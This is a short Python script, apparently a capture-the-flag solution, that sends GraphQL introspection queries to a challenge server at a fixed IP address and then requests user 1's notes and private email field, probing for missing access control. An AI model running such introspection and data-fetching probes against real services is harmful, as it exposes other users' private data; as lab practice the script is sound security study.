import requests
import time

u='http://202.38.93.111:15001/graphql'
h={
    'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
    'cookie':'',
}
d={
    'query':"{ notes(userId: 1) { id\ncontents }}"
}
d={
    'query':"{  __schema {    types {      name    }  }}"
}
d={
    'query':"""{
  __type (name: "notes") {
    name
    fields {
      name
      type {
        name
        kind
        ofType {
          name
          kind
        }
      }
    }
  }
}"""
}
d={
    'query':"{ user(id:1) { id privateEmail}}"
}
res=requests.post(u,data=d,headers=h).json()
import json
s=json.dumps(res,indent=4)
open('ctf/ans.json','w').write(s)